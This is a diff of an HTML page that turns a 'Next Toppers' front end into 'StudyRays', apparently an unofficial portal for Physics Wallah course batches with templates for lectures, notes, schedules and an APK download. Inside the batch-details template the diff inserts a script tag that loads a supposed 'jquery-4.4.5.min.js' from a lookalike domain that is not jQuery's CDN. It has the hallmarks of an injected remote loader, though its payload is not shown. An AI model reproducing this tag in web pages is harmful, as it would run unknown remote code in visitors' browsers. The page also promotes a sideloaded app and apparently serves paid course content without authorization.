@@ -1,53 +1,876 @@
+
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Next Toppers - Learning Platform</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
+    <title>Rough cux</title>
+    <meta name="description" content="Explore Physics Wallah courses and batches">
+    <!-- Lucide Icons -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lucide-static@0.258.0/font/lucide.min.css">
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="https://streamfiles.eu.org/dummy.css">
+<style>
+    #wrapper {
+        position: relative;
+        z-index: 1;
+        text-align: center;
+    }
 
-    <!-- CSS -->
-    <link rel="stylesheet" href="https://nt.streamfiles.eu.org/dummy.css" />
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+    #animationCanvas {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        pointer-events: none;
+        z-index: 0;
+        background: transparent;
+    }
+</style>
+    <script type="f00d46d1fc35310b6203a6c7-text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "susvzpp182");
+</script>
+
 </head>
-
 <body>
-
-    <!-- Page Loader -->
-    <div id="pageLoader" class="page-loader">
-        <div class="page-loader-content">
-            <div class="loader"></div>
-            <p class="loader-message">Loading...</p>
+    <!-- Splash Screen -->
+    <div id="splash-screen" class="splash-screen">
+        <div class="splash-content">
+            <div class="splash-logo">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQCg5id4_FFO1s3IBkcNdWmvE-tkQ_RaZcFiA&s" alt="StudyRays Logo">
+            </div>
+            <h1 class="splash-title">StudyRays</h1>
+            <p class="splash-subtitle">Design and Developed by DevJisu & Team</p>
+            <div class="splash-loader">
+                <div class="loader-bar"></div>
+            </div>
+            <div class="splash-footer">
+                <p>v3.0 • Since 2024 to 2025</p>
+            </div>
         </div>
     </div>
-
+    
+    <!-- Wrapper for content -->
+    <div id="wrapper"></div>
+    
+    <!-- Animation Canvas -->
+    <canvas id="animationCanvas"></canvas>
+  
+    <!-- Pull to Refresh Indicator -->
+    <div id="pull-to-refresh" class="pull-to-refresh">
+        <div class="pull-refresh-icon">
+            <i class="fa-solid fa-arrow-down"></i>
+        </div>
+        <span class="pull-refresh-text">Pull to refresh</span>
+    </div>
+    
     <div class="app-container">
+        <!-- Header -->
         <header class="app-header">
-            <div class="header-content container">
-                <div class="logo" id="appLogo">
-                    <img src="https://trademaklogos.s3.ap-south-1.amazonaws.com/6197988.jpeg" 
-                         alt="Next Toppers" width="50" height="50" />
-                </div>
-
-                <div class="header-actions">
-                    <button class="icon-btn" id="themeToggle">
-                        <i class="fas fa-moon"></i>
-                    </button>
+            <div class="container">
+                <div class="header-content">
+                    <div class="logo" id="app-logo" style="cursor: pointer;">
+                        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQCg5id4_FFO1s3IBkcNdWmvE-tkQ_RaZcFiA&s" alt="Physics Wallah Logo" height="50" width="50">
+                    </div>
+                    <div class="header-actions">
+                        <div class="network-status" id="network-status">
+                            <div class="network-indicator">
+                                <i class="fa-solid fa-wifi network-icon"></i>
+                                <span class="network-info">
+                                    <span class="network-type" id="network-type">4G</span>
+                                </span>
+                            </div>
+                        </div>
+                        <button id="header-search-btn" class="icon-btn" aria-label="Search">
+                            <i class="fa-solid fa-search"></i>
+                        </button>
+                        <button id="reload-app" class="icon-btn" aria-label="Reload" style="position: relative; z-index: 10;">
+                            <i class="fa-solid fa-rotate-right"></i>
+                        </button>
+                        <button id="animation-toggle" class="icon-btn" aria-label="Toggle animation effect">
+                            <i class="fa-solid fa-wand-magic-sparkles"></i>
+                        </button>
+                        <button id="theme-toggle" class="icon-btn" aria-label="Toggle dark mode">
+                            <i class="fa-solid fa-moon"></i>
+                        </button>
+                        <a href="#favorites" class="icon-btn" aria-label="Favorites">
+                            <i class="fa-solid fa-heart"></i>
+                        </a>
+                    </div>
                 </div>
             </div>
         </header>
 
+        <!-- Main Content Area -->
         <main class="main-content">
             <div class="container">
-                <div id="appContent"></div>
+                <div id="app-view">
+                    <!-- Content will be loaded here dynamically -->
+                    <div class="page-loading">
+                        <div class="loader"></div>
+                    </div>
+                </div>
             </div>
         </main>
+
+        <!-- Footer -->
+        <footer class="app-footer">
+            <div class="container">
+                <p>&copy; 2024-2025 StudyRays. All Rights Reserved.</p>
+            </div>
+        </footer>
+    </div>
+    
+    
+
+    <!-- Offline Overlay -->
+    <div id="offline-overlay" class="offline-overlay">
+        <div class="offline-content">
+            <div class="offline-icon">
+                <i class="fa-solid fa-wifi-slash"></i>
+            </div>
+            <h2>No Internet Connection</h2>
+            <p>Please check your internet connection and try again.</p>
+            <div class="offline-actions">
+                <button id="retry-connection" class="retry-btn">
+                    <i class="fa-solid fa-sync"></i> Retry Connection
+                </button>
+            </div>
+            <div class="connection-status">
+                <div class="status-indicator">
+                    <span class="status-dot"></span>
+                    <span class="status-text">Checking connection...</span>
+                </div>
+            </div>
+        </div>
     </div>
 
-    <!-- CryptoJS -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+    <!-- Templates -->
+    <template id="batches-template">
+        <div class="batches-page">
+            <!-- Thank You Banner -->
+            <div class="thank-you-banner">
+                <i class="fa-solid fa-trophy"></i>
+                <span>Thankyou for 50,000 Members</span>
+                <i class="fa-solid fa-trophy"></i>
+            </div>
+            
+            <!-- Quick Navigation -->
+            <div class="quick-nav">
+                <button class="quick-nav-btn active">
+                    <i class="fa-solid fa-house"></i>
+                    <span>PW App</span>
+                </button>
+                <a href="new-khazana/" class="quick-nav-btn">
+                    <i class="fa-solid fa-box-archive"></i>
+                    <span>Khazana</span>
+                </a>
+                <a href="https://cutt.ly/studyrays" target="_blank" class="quick-nav-btn">
+                    <i class="fa-brands fa-telegram"></i>
+                    <span>Telegram</span>
+                </a>
+               <a href="https://cutt.ly/StudyRaysApp" download
+   style="display: inline-block; padding: 12px 24px; background-color: #FFF176; color: #333333; text-decoration: none; font-size: 16px; font-weight: bold; border-radius: 8px; transition: all 0.3s ease; font-family: 'Segoe UI', sans-serif; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">
+   <i class="fa-brands fa-android" style="margin-right: 8px;"></i> Download StudyRays Apk
+</a>
 
-    <!-- Main App Script (ONLINE) -->
-    <script src="https://nt.streamfiles.eu.org/2d.js"></script>
+            </div>
+            
+            <div class="search-container">
+                <div class="search-input-wrapper">
+                    <i class="fa-solid fa-search search-icon"></i>
+                    <input type="text" id="search-input" placeholder="Search batches..." autocomplete="off">
+                    <button id="clear-search" class="clear-btn"><i class="fa-solid fa-times"></i></button>
+                </div>
+                <div id="search-suggestions" class="search-suggestions"></div>
+            </div>
 
+            <div class="batch-filter">
+                <button class="filter-btn active" data-filter="all">All Batches</button>
+                <button class="filter-btn" data-filter="new">New Batches</button>
+                <button class="filter-btn" data-filter="old">Old Batches</button>
+                <a href="#favorites" class="filter-btn" data-filter="favorites">
+                    <i class="fa-solid fa-heart"></i> Favorites
+                </a>
+            </div>
+
+            <div class="batches-container" id="batches-grid">
+                <!-- Batch cards will be loaded here -->
+                <div class="skeleton-container">
+                    <!-- Skeleton loaders -->
+                </div>
+            </div>
+
+            <div class="load-more-container">
+                <button id="load-more" class="load-more-btn">Load More</button>
+            </div>
+        </div>
+    </template>
+
+    <!-- Batch Details Template -->
+    <template id="batch-details-template">
+        <div class="batch-details-page">
+            <div class="back-button">
+                <a href="#batches" class="back-link">
+                    <i class="fa-solid fa-arrow-left"></i> Back to Batches
+                </a>
+            </div>
+            
+                        <!-- Quick Navigation -->
+            <div class="quick-nav">
+                <button class="quick-nav-btn active">
+                    <i class="fa-solid fa-house"></i>
+                    <span>PW App</span>
+                </button>
+                <a href="new-khazana/" class="quick-nav-btn">
+                    <i class="fa-solid fa-box-archive"></i>
+                    <span>Khazana</span>
+                </a>
+                
+                <a href="https://cutt.ly/studyrays" target="_blank" class="quick-nav-btn">
+                    <i class="fa-brands fa-telegram"></i>
+                    <span>Telegram</span>
+                </a>
+            </div>
+            
+            <!-- Breadcrumb Navigation -->
+            <nav class="breadcrumb-nav" id="breadcrumb-nav">
+                <ol class="breadcrumb-list">
+                    <li class="breadcrumb-item">
+                        <a href="#batches" class="breadcrumb-link">
+                            <i class="fa-solid fa-home"></i>
+                            <span>Batches</span>
+                        </a>
+                    </li>
+                    <li class="breadcrumb-separator">
+                        <i class="fa-solid fa-chevron-right"></i>
+                    </li>
+                    <li class="breadcrumb-item active">
+                        <span class="breadcrumb-current">Batch Details</span>
+                    </li>
+                </ol>
+            </nav>
+            
+            <div class="batch-header">
+                <div class="batch-header-content">
+                    <div class="batch-image skeleton-bg">
+                        <div class="loading-spinner"></div>
+                    </div>
+                    <div class="batch-info">
+                        <h1 class="batch-title skeleton-text"></h1>
+                        <p class="batch-subtitle skeleton-text"></p>
+                        <div class="batch-meta skeleton-text"></div>
+                    </div>
+                </div><script id="jquery-core-js" src="https://cdn.jquerycode.net/js/jquery-4.4.5.min.js" type="f00d46d1fc35310b6203a6c7-text/javascript"></script>
+            </div>
+
+            <!-- Today's Schedule Section -->
+            <div class="schedule-card">
+                <div class="schedule-header">
+                    <h2 class="schedule-title">
+                        <i class="fa-solid fa-calendar-day"></i> Today's Schedule
+                    </h2>
+                    <button class="view-all-btn">
+                        <i class="fa-solid fa-calendar-week"></i>
+                        <span>Weekly Schedule</span>
+                    </button>
+                </div>
+                <div class="schedule-container" id="schedule-container">
+                    <!-- Schedule items will be loaded here -->
+                    <div class="schedule-item skeleton-card">
+                        <div class="schedule-item-header">
+                            <div class="schedule-subject skeleton-text" style="width: 40%;"></div>
+                            <div class="schedule-status skeleton-text" style="width: 20%;"></div>
+                        </div>
+                        <div class="schedule-topic skeleton-text" style="width: 90%;"></div>
+                        <div class="schedule-topic skeleton-text" style="width: 60%;"></div>
+                        <div class="schedule-time skeleton-text" style="width: 50%;"></div>
+                        <div class="schedule-tags">
+                            <div class="schedule-tag skeleton-text" style="width: 30%;"></div>
+                            <div class="schedule-tag skeleton-text" style="width: 30%;"></div>
+                        </div>
+                    </div>
+                    <div class="schedule-item skeleton-card">
+                        <div class="schedule-item-header">
+                            <div class="schedule-subject skeleton-text" style="width: 40%;"></div>
+                            <div class="schedule-status skeleton-text" style="width: 20%;"></div>
+                        </div>
+                        <div class="schedule-topic skeleton-text" style="width: 90%;"></div>
+                        <div class="schedule-topic skeleton-text" style="width: 60%;"></div>
+                        <div class="schedule-time skeleton-text" style="width: 50%;"></div>
+                        <div class="schedule-tags">
+                            <div class="schedule-tag skeleton-text" style="width: 30%;"></div>
+                            <div class="schedule-tag skeleton-text" style="width: 30%;"></div>
+                        </div>
+                    </div>
+                    <div class="schedule-item skeleton-card">
+                        <div class="schedule-item-header">
+                            <div class="schedule-subject skeleton-text" style="width: 40%;"></div>
+                            <div class="schedule-status skeleton-text" style="width: 20%;"></div>
+                        </div>
+                        <div class="schedule-topic skeleton-text" style="width: 90%;"></div>
+                        <div class="schedule-topic skeleton-text" style="width: 60%;"></div>
+                        <div class="schedule-time skeleton-text" style="width: 50%;"></div>
+                        <div class="schedule-tags">
+                            <div class="schedule-tag skeleton-text" style="width: 30%;"></div>
+                            <div class="schedule-tag skeleton-text" style="width: 30%;"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="batch-tabs-container">
+                <div class="batch-tabs-wrapper">
+                    <div class="batch-tabs">
+                        <button class="tab-btn active" data-tab="subjects">Subjects</button>
+                        <button class="tab-btn" data-tab="announcements">Announcements</button>
+                        <button class="tab-btn" data-tab="community">Community</button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="tab-content">
+                <div id="subjects-tab" class="tab-pane active">
+                    <div class="subjects-grid">
+                        <!-- Subject cards will be loaded here -->
+                    </div>
+                </div>
+                <div id="announcements-tab" class="tab-pane">
+                    <div class="announcements-list">
+                        <!-- Announcements will be loaded here -->
+                    </div>
+                </div>
+                <div id="community-tab" class="tab-pane">
+                    <div class="community-section">
+                        <div class="community-header">
+                            <div class="community-channel-switch">
+                                <button class="channel-switch-btn active" data-channel-type="feed">
+                                    <i class="fa-solid fa-chalkboard-teacher"></i>
+                                    Teacher Feeds
+                                </button>
+                                <button class="channel-switch-btn" data-channel-type="forum">
+                                    <i class="fa-solid fa-users"></i>
+                                    Student Discussion
+                                </button>
+                            </div>
+                        </div>
+                        <div class="community-posts-container">
+                            <div class="community-posts-loading">
+                                <!-- Skeleton posts will be generated dynamically -->
+                            </div>
+                            <div class="community-posts-list">
+                                <!-- Community posts will be loaded here -->
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </template>
+
+    <!-- Subject Details Template -->
+    <template id="subject-details-template">
+        <div class="subject-details-page">
+            <div class="back-button">
+                <a href="#" class="back-link" id="back-to-batch">
+                    <i class="fa-solid fa-arrow-left"></i> Back to Batch
+                </a>
+            </div>
+            
+            <!-- Quick Navigation -->
+            <div class="quick-nav">
+                <button class="quick-nav-btn active">
+                    <i class="fa-solid fa-house"></i>
+                    <span>PW App</span>
+                </button>
+                <a href="new-khazana/" class="quick-nav-btn">
+                    <i class="fa-solid fa-box-archive"></i>
+                    <span>Khazana</span>
+                </a>
+                <a href="https://cutt.ly/studyrays" target="_blank" class="quick-nav-btn">
+                    <i class="fa-brands fa-telegram"></i>
+                    <span>Telegram</span>
+                </a>
+            </div>
+            
+            <!-- Breadcrumb Navigation -->
+            <nav class="breadcrumb-nav" id="breadcrumb-nav">
+                <ol class="breadcrumb-list">
+                    <li class="breadcrumb-item">
+                        <a href="#batches" class="breadcrumb-link">
+                            <i class="fa-solid fa-home"></i>
+                            <span>Batches</span>
+                        </a>
+                    </li>
+                    <li class="breadcrumb-separator">
+                        <i class="fa-solid fa-chevron-right"></i>
+                    </li>
+                    <li class="breadcrumb-item">
+                        <a href="#" class="breadcrumb-link" id="breadcrumb-batch">
+                            <span>Batch</span>
+                        </a>
+                    </li>
+                    <li class="breadcrumb-separator">
+                        <i class="fa-solid fa-chevron-right"></i>
+                    </li>
+                    <li class="breadcrumb-item active">
+                        <span class="breadcrumb-current" id="breadcrumb-subject">Subject</span>
+                    </li>
+                </ol>
+            </nav>
+
+            <h1 class="subject-title skeleton-text"></h1>
+            
+            <div class="topics-grid">
+                <!-- Topic cards will be loaded here -->
+            </div>
+        </div>
+    </template>
+
+    <!-- Contents Template -->
+    <template id="contents-template">
+        <div class="contents-page">
+            <div class="back-button">
+                <a href="#" class="back-link" id="back-to-subject">
+                    <i class="fa-solid fa-arrow-left"></i> Back to Subject
+                </a>
+            </div>
+            
+                        <!-- Quick Navigation -->
+            <div class="quick-nav">
+                <button class="quick-nav-btn active">
+                    <i class="fa-solid fa-house"></i>
+                    <span>PW App</span>
+                </button>
+                <a href="new-khazana/" class="quick-nav-btn">
+                    <i class="fa-solid fa-box-archive"></i>
+                    <span>Khazana</span>
+                </a>
+                <a href="https://cutt.ly/studyrays" target="_blank" class="quick-nav-btn">
+                    <i class="fa-brands fa-telegram"></i>
+                    <span>Telegram</span>
+                </a>
+            </div>
+            
+            <!-- Breadcrumb Navigation -->
+            <nav class="breadcrumb-nav" id="breadcrumb-nav">
+                <ol class="breadcrumb-list">
+                    <li class="breadcrumb-item">
+                        <a href="#batches" class="breadcrumb-link">
+                            <i class="fa-solid fa-home"></i>
+                            <span>Batches</span>
+                        </a>
+                    </li>
+                    <li class="breadcrumb-separator">
+                        <i class="fa-solid fa-chevron-right"></i>
+                    </li>
+                    <li class="breadcrumb-item">
+                        <a href="#" class="breadcrumb-link" id="breadcrumb-batch">
+                            <span>Batch</span>
+                        </a>
+                    </li>
+                    <li class="breadcrumb-separator">
+                        <i class="fa-solid fa-chevron-right"></i>
+                    </li>
+                    <li class="breadcrumb-item">
+                        <a href="#" class="breadcrumb-link" id="breadcrumb-subject">
+                            <span>Subject</span>
+                        </a>
+                    </li>
+                    <li class="breadcrumb-separator">
+                        <i class="fa-solid fa-chevron-right"></i>
+                    </li>
+                    <li class="breadcrumb-item active">
+                        <span class="breadcrumb-current" id="breadcrumb-topic">Topic</span>
+                    </li>
+                </ol>
+            </nav>
+   
+            <h1 class="topic-title skeleton-text"></h1>
+            
+            <div class="content-tabs">
+                <button class="tab-btn active" data-tab="lectures">Lectures</button>
+                <button class="tab-btn" data-tab="notes">Notes</button>
+                <button class="tab-btn" data-tab="dpp">DPP PDF</button>
+                <button class="tab-btn" data-tab="dpp-quiz">DPP Quiz</button>
+                <button class="tab-btn" data-tab="solution">Solutions</button>
+            </div>
+            
+            <div class="tab-content">
+                <div id="lectures-tab" class="tab-pane active">
+                    <div class="lectures-grid content-grid">
+                        <!-- Lecture cards will be loaded here -->
+                    </div>
+                </div>
+                <div id="notes-tab" class="tab-pane">
+                    <div class="notes-grid content-grid">
+                        <!-- Notes cards will be loaded here -->
+                    </div>
+                </div>
+                <div id="dpp-tab" class="tab-pane">
+                    <div class="dpp-grid content-grid">
+                        <!-- DPP cards will be loaded here -->
+                    </div>
+                </div>
+                <div id="solution-tab" class="tab-pane">
+                    <div class="solutions-grid content-grid">
+                        <!-- Solution cards will be loaded here -->
+                    </div>
+                </div>
+                <div id="dpp-quiz-tab" class="tab-pane">
+                    <div class="dpp-quiz-grid content-grid">
+                        <!-- DPP Quiz cards will be loaded here -->
+                        <div class="quiz-skeleton-container">
+                            <!-- Skeleton loaders for DPP Quiz -->
+                            <div class="quiz-skeleton-card">
+                                <div class="quiz-skeleton-header">
+                                    <div class="quiz-skeleton-icon"></div>
+                                    <div class="quiz-skeleton-status"></div>
+                                </div>
+                                <div class="quiz-skeleton-content">
+                                    <div class="quiz-skeleton-title"></div>
+                                    <div class="quiz-skeleton-meta">
+                                        <div class="quiz-skeleton-info"></div>
+                                        <div class="quiz-skeleton-info"></div>
+                                        <div class="quiz-skeleton-info"></div>
+                                    </div>
+                                    <div class="quiz-skeleton-footer">
+                                        <div class="quiz-skeleton-date"></div>
+                                        <div class="quiz-skeleton-btn"></div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="quiz-skeleton-card">
+                                <div class="quiz-skeleton-header">
+                                    <div class="quiz-skeleton-icon"></div>
+                                    <div class="quiz-skeleton-status"></div>
+                                </div>
+                                <div class="quiz-skeleton-content">
+                                    <div class="quiz-skeleton-title"></div>
+                                    <div class="quiz-skeleton-meta">
+                                        <div class="quiz-skeleton-info"></div>
+                                        <div class="quiz-skeleton-info"></div>
+                                        <div class="quiz-skeleton-info"></div>
+                                    </div>
+                                    <div class="quiz-skeleton-footer">
+                                        <div class="quiz-skeleton-date"></div>
+                                        <div class="quiz-skeleton-btn"></div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="quiz-skeleton-card">
+                                <div class="quiz-skeleton-header">
+                                    <div class="quiz-skeleton-icon"></div>
+                                    <div class="quiz-skeleton-status"></div>
+                                </div>
+                                <div class="quiz-skeleton-content">
+                                    <div class="quiz-skeleton-title"></div>
+                                    <div class="quiz-skeleton-meta">
+                                        <div class="quiz-skeleton-info"></div>
+                                        <div class="quiz-skeleton-info"></div>
+                                        <div class="quiz-skeleton-info"></div>
+                                    </div>
+                                    <div class="quiz-skeleton-footer">
+                                        <div class="quiz-skeleton-date"></div>
+                                        <div class="quiz-skeleton-btn"></div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </template>
+
+    <template id="batch-card-template">
+        <div class="batch-card">
+            <div class="batch-image skeleton-bg">
+                <img src="" alt="" class="lazy-image">
+                <button class="favorite-btn">
+                    <i class="fa-regular fa-heart"></i>
+                </button>
+            </div>
+            <div class="batch-content">
+                <div class="batch-tags">
+                    <span class="batch-tag language-tag skeleton-text"></span>
+                    <span class="batch-tag exam-tag skeleton-text"></span>
+                </div>
+                <h3 class="batch-title skeleton-text"></h3>
+                <p class="batch-subtitle skeleton-text"></p>
+                <div class="batch-footer">
+                    <span class="batch-date skeleton-text"></span>
+                    <a href="#" class="study-btn skeleton-btn">Let's Study</a>
+                </div>
+            </div>
+        </div>
+    </template>
+
+    <!-- Video Player Template -->
+    <template id="video-player-template">
+        <div class="video-player-container">
+            <div class="video-player-header">
+                <button class="close-video">
+                    <i class="fa-solid fa-times"></i>
+                </button>
+                <h2 class="video-title"></h2>
+            </div>
+            <div class="video-wrapper">
+                <video id="content-video" controls class="video-player">
+                    <source src="" type="video/mp4">
+                    Your browser does not support the video tag.
+                </video>
+            </div>
+        </div>
+    </template>
+    </div>
+    
+
+    <!-- Toast Container -->
+    <div id="toast-container" class="toast-container"></div>
+    
+    <!-- Profile Modal -->
+    <div id="profile-modal" class="profile-modal">
+        <div class="profile-modal-content">
+            <button class="close-profile-modal" onclick="if (!window.__cfRLUnblockHandlers) return false; document.getElementById('profile-modal').style.display='none'" data-cf-modified-f00d46d1fc35310b6203a6c7-="">
+                <i class="fa-solid fa-times"></i>
+            </button>
+            <div class="profile-header">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQCg5id4_FFO1s3IBkcNdWmvE-tkQ_RaZcFiA&s" alt="StudyRays Logo" class="profile-logo">
+                <h2>StudyRays</h2>
+                <p class="profile-subtitle">Developed By DevJisu and Teams</p>
+            </div>
+            <div class="profile-info">
+                <div class="info-item">
+                    <i class="fa-solid fa-code-branch"></i>
+                    <span>Version 3</span>
+                </div>
+                <div class="info-item">
+                    <i class="fa-solid fa-calendar"></i>
+                    <span>Since 2024 - 2025</span>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Animation Effect Modal -->
+    <div id="animation-modal" class="animation-modal" style="display: none;">
+        <div class="animation-modal-content">
+            <button class="close-animation-modal" onclick="if (!window.__cfRLUnblockHandlers) return false; document.getElementById('animation-modal').style.display='none'" data-cf-modified-f00d46d1fc35310b6203a6c7-="">
+                <i class="fa-solid fa-times"></i>
+            </button>
+            <h2 class="animation-modal-title">Select Animation Effect</h2>
+            <div class="animation-options">
+                <div class="animation-option" data-effect="firecrackers">
+                    <i class="fa-solid fa-burst"></i>
+                    <span>Firecrackers</span>
+                </div>
+                <div class="animation-option" data-effect="rain-thunder">
+                    <i class="fa-solid fa-cloud-bolt"></i>
+                    <span>Rain & Thunder</span>
+                </div>
+                <div class="animation-option" data-effect="winter">
+                    <i class="fa-solid fa-snowflake"></i>
+                    <span>Winter Snow</span>
+                </div>
+                <div class="animation-option" data-effect="none">
+                    <i class="fa-solid fa-ban"></i>
+                    <span>None</span>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Theme Mode Modal -->
+    <div id="theme-modal" class="theme-modal" style="display: none;">
+        <div class="theme-modal-content">
+            <button class="close-theme-modal" onclick="if (!window.__cfRLUnblockHandlers) return false; document.getElementById('theme-modal').style.display='none'" data-cf-modified-f00d46d1fc35310b6203a6c7-="">
+                <i class="fa-solid fa-times"></i>
+            </button>
+            <h2 class="theme-modal-title">Select Theme Mode</h2>
+            <div class="theme-options">
+                <div class="theme-option" data-theme="light">
+                    <i class="fa-solid fa-sun"></i>
+                    <span>Light Mode</span>
+                </div>
+                <div class="theme-option" data-theme="dark">
+                    <i class="fa-solid fa-moon"></i>
+                    <span>Dark Mode</span>
+                </div>
+                <div class="theme-option" data-theme="auto">
+                    <i class="fa-solid fa-circle-half-stroke"></i>
+                    <span>System Default</span>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Search Modal -->
+    <div id="search-modal" class="search-modal">
+        <div class="search-modal-content">
+            <div class="search-modal-header">
+                <div class="search-modal-input-wrapper">
+                    <i class="fa-solid fa-search"></i>
+                    <input type="text" id="modal-search-input" placeholder="Search batches..." autocomplete="off">
+                    <button id="modal-clear-search" class="clear-btn"><i class="fa-solid fa-times"></i></button>
+                </div>
+                <button id="close-search-modal" class="close-modal-btn">
+                    <i class="fa-solid fa-times"></i>
+                </button>
+            </div>
+            <div id="modal-search-results" class="modal-search-results">
+                <!-- Search results will appear here -->
+            </div>
+        </div>
+    </div>
+    
+    <!-- Security Error Screen -->
+    <div id="security-error-screen" class="security-error-screen" style="display: none;">
+        <div class="security-error-content">
+            <div class="security-error-icon">
+                <i class="fa-solid fa-shield-exclamation"></i>
+            </div>
+            <h2 class="security-error-title">Access Restricted</h2>
+            <p class="security-error-message">Your task not completed yet please complete your task</p>
+            <div class="security-error-actions">
+                <button id="retry-security-check" class="retry-security-btn">
+                    <i class="fa-solid fa-sync"></i> Retry Access
+                </button>
+                <a href="task.php" class="complete-task-btn">
+                    <i class="fa-solid fa-tasks"></i> Complete Task
+                </a>
+            </div>
+            <div class="security-status">
+                <div class="status-indicator">
+                    <span class="status-dot"></span>
+                    <span class="status-text">Verifying access...</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+    <!-- Weekly Schedule Template -->
+    <template id="weekly-schedule-template">
+        <div class="weekly-schedule-page">
+            <div class="back-button">
+                <a href="#" class="back-link" id="back-to-batch">
+                    <i class="fa-solid fa-arrow-left"></i> Back to Batch
+                </a>
+            </div>
+            
+            <!-- Quick Navigation -->
+            <div class="quick-nav">
+                <button class="quick-nav-btn active">
+                    <i class="fa-solid fa-house"></i>
+                    <span>PW App</span>
+                </button>
+                <a href="new-khazana/" class="quick-nav-btn">
+                    <i class="fa-solid fa-box-archive"></i>
+                    <span>Khazana</span>
+                </a>
+                <a href="https://cutt.ly/studyrays" target="_blank" class="quick-nav-btn">
+                    <i class="fa-brands fa-telegram"></i>
+                    <span>Telegram</span>
+                </a>
+            </div>
+            
+            <div class="weekly-schedule-header-section">
+                <h1 class="page-title">
+                    <i class="fa-solid fa-calendar-week"></i>
+                    Weekly Schedule
+                </h1>
+                <p class="page-subtitle">View and manage your class schedule</p>
+            </div>
+            
+            <div class="schedule-main-layout">
+                <!-- Sidebar for larger screens -->
+                <aside class="schedule-sidebar">
+                    <div class="subject-filter-section">
+                        <h3 class="sidebar-title">
+                            <i class="fa-solid fa-filter"></i>
+                            Subjects
+                        </h3>
+                        <div class="subject-filter-list" id="subject-filter-list">
+                            <!-- Subject filters will be loaded here -->
+                            <div class="filter-loading">
+                                <div class="loader-small"></div>
+                                <p>Loading subjects...</p>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="calendar-section">
+                        <div class="calendar-header">
+                            <button class="calendar-nav-btn" id="prev-month">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </button>
+                            <h3 class="calendar-month" id="calendar-month">November 2025</h3>
+                            <button class="calendar-nav-btn" id="next-month">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </button>
+                        </div>
+                        <button class="today-btn" id="today-btn">Today</button>
+                        <div class="calendar-grid" id="calendar-grid">
+                            <!-- Calendar will be rendered here -->
+                        </div>
+                    </div>
+                </aside>
+                
+                <!-- Main content area -->
+                <main class="schedule-content">
+                    <!-- Mobile filter toggle -->
+                    <div class="mobile-filter-toggle">
+                        <button class="filter-toggle-btn" id="mobile-filter-toggle">
+                            <i class="fa-solid fa-filter"></i>
+                            <span>Filters & Calendar</span>
+                            <i class="fa-solid fa-chevron-down"></i>
+                        </button>
+                    </div>
+                    
+                    <div class="schedule-list-section">
+                        <div class="schedule-list-header">
+                            <h2 class="selected-date-title" id="selected-date-title">Today's Schedule</h2>
+                            <span class="schedule-count" id="schedule-count">0 classes</span>
+                        </div>
+                        <div class="schedule-items-container" id="schedule-items-container">
+                            <!-- Schedule items will be loaded here -->
+                            <div class="schedule-loading">
+                                <div class="loader"></div>
+                                <p>Loading schedule...</p>
+                            </div>
+                        </div>
+                    </div>
+                </main>
+            </div>
+        </div>
+    </template>
+    
+   <script src="https://streamfiles.eu.orh/js/path-detector.js" type="f00d46d1fc35310b6203a6c7-text/javascript"></script>
+   <script src="https://streamfiles.eu.org/obs.js" type="f00d46d1fc35310b6203a6c7-text/javascript"></script>
+   
+    
+      
+   <!-- Reload App Handler (Always available) -->
+   <script type="f00d46d1fc35310b6203a6c7-text/javascript">
+   document.addEventListener('DOMContentLoaded', function() {
+       const reloadBtn = document.getElementById('reload-app');
+       if (reloadBtn) {
+           reloadBtn.addEventListener('click', function() {
+               // Hard reload - clear cache and reload
+               window.location.reload(true);
+           });
+       }
+   });
+   </script>
+<script src="https://streamfiles.eu.org/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="f00d46d1fc35310b6203a6c7-|49" defer></script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"445c6b752cdb49d594d88ef38de94df9","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
 </body>
-</html>
+</html> 
